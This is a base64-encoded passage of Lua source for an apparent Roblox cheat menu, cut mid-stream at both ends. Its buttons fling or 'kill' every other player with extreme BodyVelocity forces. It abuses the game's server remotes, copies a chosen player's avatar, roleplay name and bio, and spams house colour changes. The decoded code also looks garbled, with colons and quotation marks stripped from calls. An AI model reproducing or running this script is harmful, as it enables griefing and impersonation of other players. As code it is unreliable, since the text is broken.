ueSArIHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlkgIDIgCiAgICAgICAgICAgICAgICBwb3MueiA9IHBvcy56ICsgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWiAgMiAKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z11GaW5kRmlyc3RDaGlsZChTZWF0MSkuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpICBDRnJhbWUubmV3KC0yLDIsMCkgCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKSAKICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW0NoYW9zIENvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAKICAgICAgICAgICAgd2FpdCgpIAogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z11GaW5kRmlyc3RDaGlsZChIYW5kbGUgKS5OYW1lID0gSGFuZGxlIAogICAgICAgICAgICB3YWl0KDAuMikgCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1tDaGFvcyBDb3VjaC4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIAogICAgICAgICAgICB3YWl0KCkgCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrIAogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z10uSGFuZGxlLk5hbWUgPSBIYW5kbGUgIAogICAgICAgICAgICB3YWl0KDAuMikgCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1tDaGFvcyBDb3VjaC4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIAogICAgICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5LCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW0NoYW9zIENvdWNoLi5za2pkZnV3aXJ1d2ddRmluZEZpcnN0Q2hpbGQoU2VhdDEpKSAKICAgICAgICAgICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpIAogICAgICAgICAgICB0ZXQuUCA9IDEyNTAgCiAgICAgICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKSAKICAgICAgICAgICAgdGV0Lk5hbWUgPSAjbU9WT09FUEYkI0BGJCNHRVJFLi5WRVdWVyAKICAgICAgICB1bnRpbCB3b2llamV3Zy5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgCiAgICAgICAgd2FpdCgpIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z11GaW5kRmlyc3RDaGlsZChIYW5kbGUgKUZpbmRGaXJzdENoaWxkKCNtT1ZPT0VQRiQjQEYkI0dFUkUuLlZFV1ZXKURlc3Ryb3koKSAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW0NoYW9zIENvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAKICAgICAgICB3YWl0KCkgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW0NoYW9zIENvdWNoLi5za2pkZnV3aXJ1d2ddRmluZEZpcnN0Q2hpbGQoSGFuZGxlICkuTmFtZSA9IEhhbmRsZSAKICAgICAgICB3YWl0KDAuMikgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW0NoYW9zIENvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgCiAgICAgICAgd2FpdCgpIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrIAogICAgZW5kIAplbmQgCmZvciBtd2VmLHdldWVyZyBpbiBwYWlycyhnYW1lLlBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvIAogICAgaWYgd2V1ZXJnLk5hbWUgPT0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUgPT0gZmFsc2UgdGhlbiAKICAgICAgICBzcGF3bihmdW5jdGlvbigpIGJyaW5nKG13ZWYsd2V1ZXJnKSBlbmQpIAogICAgZW5kIAplbmQgCgotLSBGdW5jdGlvbiB0byB0ZWxlcG9ydCB0aGUgcGxheWVyIGJhY2sgdG8gdGhlIGluaXRpYWwgcG9zaXRpb24gYWZ0ZXIgMTAgc2Vjb25kcwp0YXNrLmRlbGF5KDE0LCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhpbml0aWFsUG9zaXRpb24pCmVuZCkKCi0tIEZ1bmN0aW9uIHRvIGNsZWFyIGFsbCB0b29scyAwLjUgc2Vjb25kcyBhZnRlciB0ZWxlcG9ydGluZyB0byB0aGUgaW5pdGlhbCBwb3NpdGlvbgp0YXNrLmRlbGF5KDE0LjEsIGZ1bmN0aW9uKCkKICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKZW5kKQogICAgZW5kCn0pCnByaW50KEtpbGwgQWxsIENvdWNoIGJ1dHRvbiBjcmVhdGVkKSAgCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gRmxpbmcgQmFsbCBBbGwsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9jYWwgcGxheWVyPWdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyCmxvY2FsIFNvY2NlckJhbGxzPXdvcmtzcGFjZS5Xb3Jrc3BhY2VDb21bMDAxX1NvY2NlckJhbGxzXQpsb2NhbCBNeUJhbGw9U29jY2VyQmFsbHNGaW5kRmlyc3RDaGlsZChTb2NjZXIuLnBsYXllci5OYW1lKQoKaWYgbm90IE15QmFsbCB0aGVuCmlmIG5vdCBwbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZChTb2NjZXJCYWxsKSB0aGVuCmxvY2FsIGFyZ3M9e1sxXT1QaWNraW5nVG9vbHMsWzJdPVNvY2NlckJhbGx9CmdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQp0YXNrLndhaXQoKQpwbGF5ZXIuQmFja3BhY2suU29jY2VyQmFsbC5QYXJlbnQ9cGxheWVyLkNoYXJhY3RlcgpyZXBlYXQgTXlCYWxsPVNvY2NlckJhbGxzRmluZEZpcnN0Q2hpbGQoU29jY2VyLi5wbGF5ZXIuTmFtZSkgdGFzay53YWl0KCkgdW50aWwgTXlCYWxsCnBsYXllci5DaGFyYWN0ZXIuU29jY2VyQmFsbC5QYXJlbnQ9cGxheWVyLkJhY2twYWNrCnRhc2sud2FpdCgpCmVsc2UKcGxheWVyLkJhY2twYWNrLlNvY2NlckJhbGwuUGFyZW50PXBsYXllci5DaGFyYWN0ZXIKcmVwZWF0IE15QmFsbD1Tb2NjZXJCYWxsc0ZpbmRGaXJzdENoaWxkKFNvY2Nlci4ucGxheWVyLk5hbWUpIHRhc2sud2FpdCgpIHVudGlsIE15QmFsbApwbGF5ZXIuQ2hhcmFjdGVyLlNvY2NlckJhbGwuUGFyZW50PXBsYXllci5CYWNrcGFjawplbmQKZW5kCgoKZm9yIGksdiBpbiBwYWlycyhnYW1lLlBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvCmlmIHZ+PWdhbWUuUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCmxvY2FsIHRhcmdldD12CmxvY2FsIFRDaGFyYWN0ZXI9dGFyZ2V0LkNoYXJhY3RlciBvciB0YXJnZXQuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKbG9jYWwgVEh1bWFub2lkUm9vdFBhcnQ9VENoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQppZiBub3QgTXlCYWxsIG9yIG5vdCBUSHVtYW5vaWRSb290UGFydCB0aGVuIHJldHVybiBlbmQKCmZvciBfLHYgaW4gcGFpcnMoTXlCYWxsR2V0Q2hpbGRyZW4oKSkgZG8KaWYgdklzQShCb2R5TW92ZXIpIHRoZW4gdkRlc3Ryb3koKSBlbmQKZW5kCgpsb2NhbCBib2R5VmVsb2NpdHk9SW5zdGFuY2UubmV3KEJvZHlWZWxvY2l0eSkKYm9keVZlbG9jaXR5LlZlbG9jaXR5PVZlY3RvcjMubmV3KDllOCw5ZTgsOWU4KQpib2R5VmVsb2NpdHkuTWF4Rm9yY2U9VmVjdG9yMy5uZXcoMTAsMTAsMTApCmJvZHlWZWxvY2l0eS5QPTFlMTAKYm9keVZlbG9jaXR5LlBhcmVudD1NeUJhbGwKCmxvY2FsIGJ2PUluc3RhbmNlLm5ldyhCb2R5VmVsb2NpdHkpCmJ2LlZlbG9jaXR5PVZlY3RvcjMubmV3KDllOCw5ZTgsOWU4KQpidi5NYXhGb3JjZT1WZWN0b3IzLm5ldygxMCwxMCwxMCkKYnYuUD0xZTkKYnYuUGFyZW50PVRIdW1hbm9pZFJvb3RQYXJ0Cgpsb2NhbCBvbGRQb3M9VEh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24Kd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdD1USHVtYW5vaWRSb290UGFydAoKcmVwZWF0CmxvY2FsIHZlbG9jaXR5PVRIdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZQpsb2NhbCBwYXJ0cz17fQpmb3IgXyx2IGluIHBhaXJzKFRDaGFyYWN0ZXJHZXREZXNjZW5kYW50cygpKSBkbwppZiB2SXNBKEJhc2VQYXJ0KSBhbmQgdi5DYW5Db2xsaWRlIGFuZCBub3Qgdi5BbmNob3JlZCB0aGVuIHRhYmxlLmluc2VydChwYXJ0cyx2KSBlbmQKZW5kCmZvciBfLHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwpsb2NhbCBwb3NfeD10YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWApsb2NhbCBwb3NfeT10YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWQpsb2NhbCBwb3Nfej10YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWgpwb3NfeD1wb3NfeCsodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlgxLjUpCnBvc195PXBvc195Kyh0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWTEuNSkKcG9zX3o9cG9zX3orKHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5aMS41KQpNeUJhbGwuQ0ZyYW1lPUNGcmFtZS5uZXcocG9zX3gscG9zX3kscG9zX3opCnRhc2sud2FpdCgxNjAwMCkKZW5kCnRhc2sud2FpdCgxNjAwMCkKdW50aWwgVEh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlNTAwMCBvciBUQ2hhcmFjdGVyLkh1bWFub2lkLkhlYWx0aD09MCBvciB0YXJnZXQuUGFyZW50fj1nYW1lLlBsYXllcnMgb3IgVEh1bWFub2lkUm9vdFBhcnQuUGFyZW50fj1UQ2hhcmFjdGVyIG9yIFRDaGFyYWN0ZXJ+PXRhcmdldC5DaGFyYWN0ZXIKCmVuZAplbmQKCndvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3Q9Z2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogIGVuZAp9KQoKCmxvY2FsIFRhYiA9IFdpbmRvd01ha2VUYWIoe0F2YXRhciwgcmJ4YXNzZXRpZDEwNzM0OTUyMDM2fSkKClRhYkFkZFNlY3Rpb24oeyBOYW1lID0gQ29weSBPdXRmaXQgfSkKCgoKbG9jYWwgUGxheWVycyA9IGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpCmxvY2FsIFJlbW90ZXMgPSBSZXBsaWNhdGVkU3RvcmFnZVdhaXRGb3JDaGlsZChSZW1vdGVzKQoKbG9jYWwgVGFyZ2V0ID0gbmlsCgotLSBGdW5jdGlvbiB0byBnZXQgcGxheWVyIG5hbWVzCmxvY2FsIGZ1bmN0aW9uIEdldFBsYXllck5hbWVzKCkKICAgIGxvY2FsIFBsYXllck5hbWVzID0ge30KICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgdGFibGUuaW5zZXJ0KFBsYXllck5hbWVzLCBwbGF5ZXIuTmFtZSkKICAgIGVuZAogICAgcmV0dXJuIFBsYXllck5hbWVzCmVuZAoKLS0gUGxheWVyIHNlbGVjdGlvbiBkcm9wZG93bgpsb2NhbCBEcm9wZG93biA9IFRhYkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSBTZWxlY3QgUGxheWVyLAogICAgT3B0aW9ucyA9IEdldFBsYXllck5hbWVzKCksCiAgICBEZWZhdWx0ID0gVGFyZ2V0LAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBUYXJnZXQgPSBWYWx1ZQogICAgZW5kCn0pCgotLSBVcGRhdGUgZHJvcGRvd24gb3B0aW9ucyB3aGVuIHNvbWVvbmUgam9pbnMgb3IgbGVhdmVzCmxvY2FsIGZ1bmN0aW9uIFVwZGF0ZURyb3Bkb3duKCkKICAgIERyb3Bkb3duUmVmcmVzaChHZXRQbGF5ZXJOYW1lcygpLCB0cnVlKQplbmQKClBsYXllcnMuUGxheWVyQWRkZWRDb25uZWN0KFVwZGF0ZURyb3Bkb3duKQpQbGF5ZXJzLlBsYXllclJlbW92aW5nQ29ubmVjdChVcGRhdGVEcm9wZG93bikKClRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gQ29weSBBdmF0YXIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgVGFyZ2V0IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBMUCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBMQ2hhciA9IExQLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIFRQbGF5ZXIgPSBQbGF5ZXJzRmluZEZpcnN0Q2hpbGQoVGFyZ2V0KQoKICAgICAgICBpZiBUUGxheWVyIGFuZCBUUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIExIdW1hbm9pZCA9IExDaGFyIGFuZCBMQ2hhckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICAgICAgbG9jYWwgVEh1bWFub2lkID0gVFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCgogICAgICAgICAgICBpZiBMSHVtYW5vaWQgYW5kIFRIdW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAtLSBSRVNFVCBMT0NBTFBMQVlFUgogICAgICAgICAgICAgICAgbG9jYWwgTERlc2MgPSBMSHVtYW5vaWRHZXRBcHBsaWVkRGVzY3JpcHRpb24oKQoKICAgICAgICAgICAgICAgIC0tIFJlbW92ZSBjdXJyZW50IGFjY2Vzc29yaWVzLCBjbG90aGVzLCBhbmQgZmFjZQogICAgICAgICAgICAgICAgZm9yIF8sIGFjYyBpbiBpcGFpcnMoTERlc2NHZXRBY2Nlc3Nvcmllcyh0cnVlKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBhY2MuQXNzZXRJZCBhbmQgdG9udW1iZXIoYWNjLkFzc2V0SWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFySW52b2tlU2VydmVyKHRvbnVtYmVyKGFjYy5Bc3NldElkKSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHRvbnVtYmVyKExEZXNjLlNoaXJ0KSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFySW52b2tlU2VydmVyKHRvbnVtYmVyKExEZXNjLlNoaXJ0KSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgdG9udW1iZXIoTERlc2MuUGFudHMpIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZW1vdGVzLldlYXJJbnZva2VTZXJ2ZXIodG9udW1iZXIoTERlc2MuUGFudHMpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5GYWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFySW52b2tlU2VydmVyKHRvbnVtYmVyKExEZXNjLkZhY2UpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAtLSBDT1BZIEZST00gVEFSR0VUIFBMQVlFUgogICAgICAgICAgICAgICAgbG9jYWwgUERlc2MgPSBUSHVtYW5vaWRHZXRBcHBsaWVkRGVzY3JpcHRpb24oKQoKICAgICAgICAgICAgICAgIC0tIFNlbmQgYm9keSBwYXJ0cwogICAgICAgICAgICAgICAgbG9jYWwgYXJnc0JvZHkgPSB7CiAgICAgICAgICAgICAgICAgICAgWzFdID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBQRGVzYy5Ub3JzbywKICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gUERlc2MuUmlnaHRBcm0sCiAgICAgICAgICAgICAgICAgICAgICAgIFszXSA9IFBEZXNjLkxlZnRBcm0sCiAgICAgICAgICAgICAgICAgICAgICAgIFs0XSA9IFBEZXNjLlJpZ2h0TGVnLAogICAgICAgICAgICAgICAgICAgICAgICBbNV0gPSBQRGVzYy5MZWZ0TGVnLAogICAgICAgICAgICAgICAgICAgICAgICBbNl0gPSBQRGVzYy5IZWFkCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgUmVtb3Rlcy5DaGFuZ2VDaGFyYWN0ZXJCb2R5SW52b2tlU2VydmVyKHVucGFjayhhcmdzQm9keSkpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQoKICAgICAgICAgICAgICAgIGlmIHRvbnVtYmVyKFBEZXNjLlNoaXJ0KSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFySW52b2tlU2VydmVyKHRvbnVtYmVyKFBEZXNjLlNoaXJ0KSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgdG9udW1iZXIoUERlc2MuUGFudHMpIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZW1vdGVzLldlYXJJbnZva2VTZXJ2ZXIodG9udW1iZXIoUERlc2MuUGFudHMpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihQRGVzYy5GYWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFySW52b2tlU2VydmVyKHRvbnVtYmVyKFBEZXNjLkZhY2UpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoUERlc2NHZXRBY2Nlc3Nvcmllcyh0cnVlKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB2LkFzc2V0SWQgYW5kIHRvbnVtYmVyKHYuQXNzZXRJZCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBSZW1vdGVzLldlYXJJbnZva2VTZXJ2ZXIodG9udW1iZXIodi5Bc3NldElkKSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIFNraW5Db2xvciA9IFRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoQm9keSBDb2xvcnMpCiAgICAgICAgICAgICAgICBpZiBTa2luQ29sb3IgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuQ2hhbmdlQm9keUNvbG9yRmlyZVNlcnZlcih0b3N0cmluZyhTa2luQ29sb3IuSGVhZENvbG9yKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgdG9udW1iZXIoUERlc2MuSWRsZUFuaW1hdGlvbikgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2Vhckludm9rZVNlcnZlcih0b251bWJlcihQRGVzYy5JZGxlQW5pbWF0aW9uKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgLS0gTmFtZSwgYmlvLCBhbmQgY29sb3IKICAgICAgICAgICAgICAgIGxvY2FsIEJhZyA9IFRQbGF5ZXJGaW5kRmlyc3RDaGlsZChQbGF5ZXJzQmFnKQogICAgICAgICAgICAgICAgaWYgQmFnIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBCYWdGaW5kRmlyc3RDaGlsZChSUE5hbWUpIGFuZCBCYWcuUlBOYW1lLlZhbHVlIH49ICB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lVGV4dEZpcmVTZXJ2ZXIoUm9sZVBsYXlOYW1lLCBCYWcuUlBOYW1lLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZ0ZpbmRGaXJzdENoaWxkKFJQQmlvKSBhbmQgQmFnLlJQQmlvLlZhbHVlIH49ICB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lVGV4dEZpcmVTZXJ2ZXIoUm9sZVBsYXlCaW8sIEJhZy5SUEJpby5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBCYWdGaW5kRmlyc3RDaGlsZChSUE5hbWVDb2xvcikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBSZW1vdGVzLlJQTmFtZUNvbG9yRmlyZVNlcnZlcihQaWNraW5nUlBOYW1lQ29sb3IsIEJhZy5SUE5hbWVDb2xvci5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBCYWdGaW5kRmlyc3RDaGlsZChSUEJpb0NvbG9yKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lQ29sb3JGaXJlU2VydmVyKFBpY2tpbmdSUEJpb0NvbG9yLCBCYWcuUlBCaW9Db2xvci5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRGVmaW5lIGNvbG9ycyBmb3IgUkdCIGVmZmVjdApsb2NhbCBjb2xvcnMgPSB7CiAgICBDb2xvcjMubmV3KDEsIDAsIDApLCAgICAgICAtLSBSZWQKICAgIENvbG9yMy5uZXcoMCwgMSwgMCksICAgICAgIC0tIEdyZWVuCiAgICBDb2xvcjMubmV3KDAsIDAsIDEpLCAgICAgICAtLSBCbHVlCiAgICBDb2xvcjMubmV3KDEsIDEsIDApLCAgICAgICAtLSBZZWxsb3cKICAgIENvbG9yMy5uZXcoMCwgMSwgMSksICAgICAgIC0tIEN5YW4KICAgIENvbG9yMy5uZXcoMSwgMCwgMSkgICAgICAgIC0tIE1hZ2VudGEKfQoKLS0gVmFyaWFibGUgdG8gY29udHJvbCB0aGUgc3RhdGUgb2YgdGhlIEhvdXNlIFJHQiB0b2dnbGUKbG9jYWwgaXNIb3VzZVJHQkFjdGl2ZSA9IGZhbHNlCgotLSBGdW5jdGlvbiB0byBjaGFuZ2UgdGhlIGhvdXNlIGNvbG9yCmxvY2FsIGZ1bmN0aW9uIGNoYW5nZUNvbG9yKCkKICAgIGxvY2FsIHJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpCiAgICBsb2NhbCByZW1vdGVFdmVudCA9IHJlcGxpY2F0ZWRTdG9yYWdlRmluZEZpcnN0Q2hpbGQoUkUpIGFuZCByZXBsaWNhdGVkU3RvcmFnZS5SRUZpbmRGaXJzdENoaWxkKDFQbGF5ZXIxc0hvdXMxZSkKICAgIAogICAgaWYgbm90IHJlbW90ZUV2ZW50IHRoZW4KICAgICAgICB3YXJuKFJlbW90ZUV2ZW50ICcxUGxheWVyMXNIb3VzMWUnIG5vdCBmb3VuZC4pCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICB3aGlsZSBpc0hvdXNlUkdCQWN0aXZlIGRvCiAgICAgICAgZm9yIF8sIGNvbG9yIGluIGlwYWlycyhjb2xvcnMpIGRvCiAgICAgICAgICAgIGlmIG5vdCBpc0hvdXNlUkdCQWN0aXZlIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gQ29sb3JQaWNrSG91c2UsCiAgICAgICAgICAgICAgICBbMl0gPSBjb2xvcgogICAgICAgICAgICB9CiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHJlbW90ZUV2ZW50RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgdGFzay53YWl0KDAuOCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHRvZ2dsZUhvdXNlUkdCKHN0YXRlKQogICAgaXNIb3VzZVJHQkFjdGl2ZSA9IHN0YXRlCiAgICBpZiBpc0hvdXNlUkdCQWN0aXZlIHRoZW4KICAgICAgICBwcmludChIb3VzZSBSR0IgQWN0aXZhdGVkKQogICAgICAgIHNwYXduKGNoYW5nZUNvbG9yKQogICAgZWxzZQogICAgICAgIHByaW50KEhvdXNlIFJHQiBEZWFjdGl2YXRlZCkKICAgIGVuZAplbmQKCi0